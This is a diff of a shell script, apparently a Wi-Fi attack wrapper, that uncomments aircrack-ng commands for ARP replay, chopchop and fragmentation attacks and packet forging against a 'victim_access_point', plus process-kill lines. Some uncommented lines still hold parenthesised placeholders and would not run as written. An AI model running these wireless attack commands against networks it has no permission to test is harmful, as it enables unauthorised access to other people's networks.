@@ -614,13 +614,13 @@ fi
 
 ##############################################################################################################
 
-# aireplay-ng --arpreplay -e (victim_access_point) -b (access_point_mac) $monitor
-# aireplay-ng --chopchop -F -h (attacker_mac) $monitor
-# packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w chop_chop.cap
+ aireplay-ng --arpreplay -e (victim_access_point) -b (access_point_mac) $monitor
+ aireplay-ng --chopchop -F -h (attacker_mac) $monitor
+ packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w chop_chop.cap
 
-# aireplay-ng --interactive -F -r /tmp/chop_chop.cap $monitor
-# aireplay-ng --fragment -F -b (access_point_mac) -h (attacker_mac) $monitor
-# packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w fragmented.cap
+ aireplay-ng --interactive -F -r /tmp/chop_chop.cap $monitor
+ aireplay-ng --fragment -F -b (access_point_mac) -h (attacker_mac) $monitor
+ packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w fragmented.cap
 
 ##############################################################################################################
 
@@ -724,8 +724,8 @@ if [ $? = 0 ]; then
 	f_return
 else
 	pkill -9 -f xterm 2>/dev/null
-	# kill -9 `ps ax | grep 'airodump-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
-	# kill -9 `ps ax | grep 'aireplay-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
+	 kill -9 `ps ax | grep 'airodump-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
+	 kill -9 `ps ax | grep 'aireplay-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
 	f_return
 fi
 }
